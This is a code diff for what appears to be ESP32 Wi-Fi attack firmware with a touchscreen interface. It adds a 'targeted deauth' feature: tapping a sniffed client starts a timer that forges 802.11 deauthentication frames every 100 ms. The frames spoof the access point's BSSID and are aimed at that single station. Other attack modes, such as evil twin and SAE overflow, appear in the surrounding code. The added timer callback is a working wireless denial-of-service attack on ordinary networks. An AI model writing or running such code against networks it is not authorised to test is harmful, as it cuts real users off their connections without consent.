@@ -247,6 +247,17 @@ static uint8_t deauth_target_bssids[MAX_SCAN_RESULTS][6];
 static uint8_t deauth_target_channels[MAX_SCAN_RESULTS];
 static int deauth_target_count = 0;
 
+// Targeted station deauth (single client)
+static uint8_t targeted_deauth_station_mac[6];
+static uint8_t targeted_deauth_ap_bssid[6];
+static char targeted_deauth_ssid[33];
+static uint8_t targeted_deauth_channel;
+static int targeted_deauth_ap_index = -1;  // AP index to return to after stop
+static volatile bool targeted_deauth_active = false;
+static lv_obj_t *targeted_deauth_status_label = NULL;
+static lv_timer_t *targeted_deauth_timer = NULL;
+static uint32_t targeted_deauth_count = 0;
+
 static lv_obj_t *evil_twin_network_dd = NULL;
 static lv_obj_t *evil_twin_html_dd = NULL;
 static lv_obj_t *evil_twin_start_btn = NULL;
@@ -655,6 +666,10 @@ static void sniffer_task(void *pvParameters);
 static void sniffer_ap_click_cb(lv_event_t *e);
 static void sniffer_observe_close_cb(lv_event_t *e);
 static void sniffer_refresh_ap_list(void);
+static void sniffer_client_click_cb(lv_event_t *e);
+static void show_targeted_deauth_screen(void);
+static void targeted_deauth_timer_cb(lv_timer_t *timer);
+static void targeted_deauth_stop_cb(lv_event_t *e);
 static void sniffer_refresh_observe_view(void);
 static void sniffer_new_client_notify(void);
 static void sae_overflow_yes_btn_cb(lv_event_t *e);
@@ -4035,11 +4050,22 @@ static void sniffer_refresh_observe_view(void) {
                      client->mac[3], client->mac[4], client->mac[5],
                      client->rssi);
             
-            lv_obj_t *client_row = lv_list_add_text(sniffer_observe_client_list, client_text);
-            lv_obj_set_style_bg_color(client_row, lv_color_make(0, 0, 0), 0);
+            // Create clickable button for each client (bigger touch target)
+            lv_obj_t *client_row = lv_list_add_btn(sniffer_observe_client_list, NULL, "");
+            lv_obj_set_style_bg_color(client_row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+            lv_obj_set_style_bg_color(client_row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
             lv_obj_set_style_bg_opa(client_row, LV_OPA_COVER, 0);
-            lv_obj_set_style_text_color(client_row, COLOR_MATERIAL_GREEN, 0);
-            lv_obj_set_style_text_font(client_row, &lv_font_montserrat_12, 0);
+            lv_obj_set_style_min_height(client_row, 45, 0);  // Bigger touch target
+            lv_obj_set_style_pad_all(client_row, 8, 0);
+            
+            lv_obj_t *client_label = lv_label_create(client_row);
+            lv_label_set_text(client_label, client_text);
+            lv_obj_set_style_text_color(client_label, COLOR_MATERIAL_GREEN, 0);
+            lv_obj_set_style_text_font(client_label, &lv_font_montserrat_14, 0);  // Bigger font
+            
+            // Add click callback for targeted deauth
+            int user_data = (sniffer_observe_ap_index << 8) | j;
+            lv_obj_add_event_cb(client_row, sniffer_client_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)user_data);
         }
     }
 }
@@ -4156,6 +4182,192 @@ static void sniffer_observe_close_cb(lv_event_t *e) {
     
     // Return to main sniffer view
     sniffer_yes_btn_cb(NULL);
+}
+
+// Timer callback for continuous targeted deauth
+static void targeted_deauth_timer_cb(lv_timer_t *timer) {
+    (void)timer;
+    if (!targeted_deauth_active) {
+        return;
+    }
+    
+    // Switch to target channel
+    esp_wifi_set_channel(targeted_deauth_channel, WIFI_SECOND_CHAN_NONE);
+    
+    // Build and send deauth frame
+    uint8_t deauth_frame[sizeof(deauth_frame_default)];
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    // Destination = target station (not broadcast!)
+    memcpy(&deauth_frame[4], targeted_deauth_station_mac, 6);
+    // Source = AP BSSID
+    memcpy(&deauth_frame[10], targeted_deauth_ap_bssid, 6);
+    // BSSID = AP BSSID
+    memcpy(&deauth_frame[16], targeted_deauth_ap_bssid, 6);
+    
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
+    targeted_deauth_count++;
+    
+    // Update status label
+    if (targeted_deauth_status_label) {
+        char status[64];
+        snprintf(status, sizeof(status), "Sending deauth... (%lu)", (unsigned long)targeted_deauth_count);
+        lv_label_set_text(targeted_deauth_status_label, status);
+    }
+}
+
+// Stop button callback for targeted deauth
+static void targeted_deauth_stop_cb(lv_event_t *e) {
+    (void)e;
+    targeted_deauth_active = false;
+    
+    if (targeted_deauth_timer) {
+        lv_timer_del(targeted_deauth_timer);
+        targeted_deauth_timer = NULL;
+    }
+    
+    targeted_deauth_status_label = NULL;
+    
+    ESP_LOGI(TAG, "Targeted deauth stopped after %lu frames", (unsigned long)targeted_deauth_count);
+    
+    // Return to sniffer observation view (same AP) instead of menu
+    if (targeted_deauth_ap_index >= 0) {
+        // Create synthetic event to re-enter observation mode
+        lv_event_t synthetic_event;
+        memset(&synthetic_event, 0, sizeof(synthetic_event));
+        synthetic_event.user_data = (void*)(intptr_t)targeted_deauth_ap_index;
+        sniffer_ap_click_cb(&synthetic_event);
+    } else {
+        // Fallback to menu if no valid AP index
+        nav_to_menu_flag = true;
+    }
+}
+
+// Show targeted deauth screen
+static void show_targeted_deauth_screen(void) {
+    create_function_page_base("Deauth Station");
+    
+    // Content area
+    lv_obj_t *content = lv_obj_create(function_page);
+    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 70);
+    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);
+    lv_obj_set_style_bg_opa(content, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(content, 0, 0);
+    lv_obj_set_style_pad_all(content, 15, 0);
+    lv_obj_set_style_pad_gap(content, 8, 0);
+    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
+    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
+    
+    // SSID label
+    lv_obj_t *ssid_lbl = lv_label_create(content);
+    char ssid_text[64];
+    snprintf(ssid_text, sizeof(ssid_text), "SSID: %s", targeted_deauth_ssid[0] ? targeted_deauth_ssid : "[Hidden]");
+    lv_label_set_text(ssid_lbl, ssid_text);
+    lv_obj_set_style_text_color(ssid_lbl, COLOR_MATERIAL_BLUE, 0);
+    lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
+    
+    // BSSID label
+    lv_obj_t *bssid_lbl = lv_label_create(content);
+    char bssid_text[64];
+    snprintf(bssid_text, sizeof(bssid_text), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+             targeted_deauth_ap_bssid[0], targeted_deauth_ap_bssid[1], targeted_deauth_ap_bssid[2],
+             targeted_deauth_ap_bssid[3], targeted_deauth_ap_bssid[4], targeted_deauth_ap_bssid[5]);
+    lv_label_set_text(bssid_lbl, bssid_text);
+    lv_obj_set_style_text_color(bssid_lbl, COLOR_MATERIAL_BLUE, 0);
+    lv_obj_set_style_text_font(bssid_lbl, &lv_font_montserrat_14, 0);
+    
+    // Station MAC label
+    lv_obj_t *station_lbl = lv_label_create(content);
+    char station_text[64];
+    snprintf(station_text, sizeof(station_text), "Station: %02X:%02X:%02X:%02X:%02X:%02X",
+             targeted_deauth_station_mac[0], targeted_deauth_station_mac[1], targeted_deauth_station_mac[2],
+             targeted_deauth_station_mac[3], targeted_deauth_station_mac[4], targeted_deauth_station_mac[5]);
+    lv_label_set_text(station_lbl, station_text);
+    lv_obj_set_style_text_color(station_lbl, lv_color_make(0, 200, 0), 0);
+    lv_obj_set_style_text_font(station_lbl, &lv_font_montserrat_14, 0);
+    
+    // Channel label
+    lv_obj_t *channel_lbl = lv_label_create(content);
+    char channel_text[32];
+    snprintf(channel_text, sizeof(channel_text), "Channel: %d", targeted_deauth_channel);
+    lv_label_set_text(channel_lbl, channel_text);
+    lv_obj_set_style_text_color(channel_lbl, COLOR_MATERIAL_BLUE, 0);
+    lv_obj_set_style_text_font(channel_lbl, &lv_font_montserrat_14, 0);
+    
+    // Status label (will be updated by timer)
+    targeted_deauth_status_label = lv_label_create(content);
+    lv_label_set_text(targeted_deauth_status_label, "Sending deauth... (0)");
+    lv_obj_set_style_text_color(targeted_deauth_status_label, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_text_font(targeted_deauth_status_label, &lv_font_montserrat_16, 0);
+    
+    // STOP button at bottom
+    lv_obj_t *stop_btn = lv_btn_create(function_page);
+    lv_obj_set_size(stop_btn, 200, 55);
+    lv_obj_align(stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(stop_btn, 0, 0);
+    lv_obj_set_style_radius(stop_btn, 8, 0);
+    lv_obj_set_style_shadow_width(stop_btn, 8, 0);
+    lv_obj_set_style_shadow_color(stop_btn, lv_color_make(0, 0, 0), 0);
+    lv_obj_set_style_shadow_opa(stop_btn, LV_OPA_30, 0);
+    
+    lv_obj_t *stop_lbl = lv_label_create(stop_btn);
+    lv_label_set_text(stop_lbl, "STOP");
+    lv_obj_set_style_text_color(stop_lbl, lv_color_make(255, 255, 255), 0);
+    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_20, 0);
+    lv_obj_center(stop_lbl);
+    
+    lv_obj_add_event_cb(stop_btn, targeted_deauth_stop_cb, LV_EVENT_CLICKED, NULL);
+    
+    // Start the deauth timer
+    targeted_deauth_active = true;
+    targeted_deauth_count = 0;
+    targeted_deauth_timer = lv_timer_create(targeted_deauth_timer_cb, 100, NULL);  // Every 100ms
+    
+    ESP_LOGI(TAG, "Started targeted deauth: Station=%02X:%02X:%02X:%02X:%02X:%02X, AP=%s, Ch=%d",
+             targeted_deauth_station_mac[0], targeted_deauth_station_mac[1], targeted_deauth_station_mac[2],
+             targeted_deauth_station_mac[3], targeted_deauth_station_mac[4], targeted_deauth_station_mac[5],
+             targeted_deauth_ssid, targeted_deauth_channel);
+}
+
+// Handle client click - start targeted deauth
+static void sniffer_client_click_cb(lv_event_t *e) {
+    int user_data = (int)(intptr_t)lv_event_get_user_data(e);
+    int ap_index = (user_data >> 8) & 0xFF;
+    int client_index = user_data & 0xFF;
+    
+    int ap_count = 0;
+    const sniffer_ap_t *aps = wifi_sniffer_get_aps(&ap_count);
+    
+    if (ap_index < 0 || ap_index >= ap_count || aps == NULL) {
+        ESP_LOGW(TAG, "Invalid AP index: %d", ap_index);
+        return;
+    }
+    
+    const sniffer_ap_t *ap = &aps[ap_index];
+    
+    if (client_index < 0 || client_index >= ap->client_count) {
+        ESP_LOGW(TAG, "Invalid client index: %d", client_index);
+        return;
+    }
+    
+    const sniffer_client_t *client = &ap->clients[client_index];
+    
+    // Store target data
+    memcpy(targeted_deauth_station_mac, client->mac, 6);
+    memcpy(targeted_deauth_ap_bssid, ap->bssid, 6);
+    strncpy(targeted_deauth_ssid, ap->ssid, sizeof(targeted_deauth_ssid) - 1);
+    targeted_deauth_ssid[sizeof(targeted_deauth_ssid) - 1] = '\0';
+    targeted_deauth_channel = ap->channel;
+    targeted_deauth_ap_index = ap_index;  // Save AP index for returning after stop
+    
+    ESP_LOGI(TAG, "Client clicked: %02X:%02X:%02X:%02X:%02X:%02X on AP %s",
+             client->mac[0], client->mac[1], client->mac[2],
+             client->mac[3], client->mac[4], client->mac[5],
+             ap->ssid[0] ? ap->ssid : "[Hidden]");
+    
+    // Show targeted deauth screen
+    show_targeted_deauth_screen();
 }
 
 static void sniffer_yes_btn_cb(lv_event_t *e)
@@ -8080,13 +8292,14 @@ void attack_event_cb(lv_event_t *e)
                 lv_label_set_long_mode(ap_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
                 lv_obj_set_width(ap_label, lv_pct(85));
                 
-                // Client rows (indented)
+                // Client rows (indented) - clickable for targeted deauth
                 for (int j = 0; j < ap->client_count && j < MAX_CLIENTS_PER_AP; j++) {
                     const sniffer_client_t *client = &ap->clients[j];
                     
                     lv_obj_t *client_row = lv_list_add_btn(list, NULL, "");
                     lv_obj_set_width(client_row, lv_pct(100));
                     lv_obj_set_style_bg_color(client_row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+                    lv_obj_set_style_bg_color(client_row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
                     lv_obj_set_style_pad_left(client_row, 30, 0);  // Indent
                     lv_obj_set_style_pad_all(client_row, 4, 0);
                     
@@ -8100,6 +8313,10 @@ void attack_event_cb(lv_event_t *e)
                     lv_obj_set_style_text_font(client_label, &lv_font_montserrat_12, 0);  // Smaller font
                     lv_label_set_long_mode(client_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
                     lv_obj_set_width(client_label, lv_pct(80));
+                    
+                    // Add click callback for targeted deauth (encode ap_index and client_index)
+                    int user_data = (i << 8) | j;
+                    lv_obj_add_event_cb(client_row, sniffer_client_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)user_data);
                 }
                 
                 // Throttle UI updates every 4 APs
